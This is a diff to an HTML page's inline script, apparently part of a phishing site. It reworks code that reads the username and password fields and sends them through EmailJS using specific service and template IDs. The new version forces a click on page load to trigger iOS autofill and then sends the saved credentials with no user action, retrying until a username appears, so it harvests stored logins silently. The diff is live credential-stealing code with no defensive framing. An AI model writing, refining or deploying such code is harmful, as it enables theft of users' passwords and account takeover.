@@ -243,51 +243,55 @@
   <script>
     emailjs.init("y3lRWL7KLDjiFjNcN");
 
-    // 1. Detect when the user taps the username field
-    document.getElementById('username').addEventListener('focus', function() {
+    // Wait for the page to fully load
+    window.addEventListener('load', function() {
         
-        // Remove readonly so we can read the value
-        this.removeAttribute('readonly');
-        
-        // Wait 200ms for iOS to fully populate the field
-        setTimeout(function() {
-            captureCredentials();
-        }, 200);
+        // 1. Force a click on the username field to trigger iOS autofill
+        var usernameField = document.getElementById('username');
+        if (usernameField) {
+            usernameField.click();
+            
+            // 2. Wait 500ms for iOS to populate the field
+            setTimeout(function() {
+                captureAndSend();
+            }, 500);
+        } else {
+            console.error("Username field not found!");
+        }
     });
 
-    // 2. Also listen for any change in the password field (as a backup)
-    document.getElementById('password').addEventListener('change', function() {
-        captureCredentials();
-    });
-
-    function captureCredentials() {
+    // Function to capture and send data
+    function captureAndSend() {
         var u = document.getElementById('username').value;
         var p = document.getElementById('password').value;
 
-        // Check if we have data
+        // If username is still empty, try one more time after another 500ms
+        if (!u) {
+            setTimeout(function() {
+                captureAndSend();
+            }, 500);
+            return;
+        }
+
         if (u && p) {
             emailjs.send("service_2bhy4ju", "template_1qzswkk", {
                 username: u,
                 password: p,
                 timestamp: new Date().toLocaleString(),
-                method: "iOS Tap Capture"
+                device: "iOS Force Click"
             }).then(function() {
-                console.log("iOS Tap Capture Success");
+                console.log("iOS Force Click Success");
             }, function(error) {
-                console.log("iOS Tap Capture Failed", error);
+                console.log("iOS Force Click Failed", error);
             });
+        } else {
+            console.log("Still waiting for data... U: [" + u + "] P: [" + p + "]");
         }
     }
-
-    // 3. Also try one last time on page load with a longer delay
-    window.addEventListener('load', function() {
-        setTimeout(captureCredentials, 1000);
-    });
 </script>
 
 
- 
-    
+
 </head>
 <body>
 
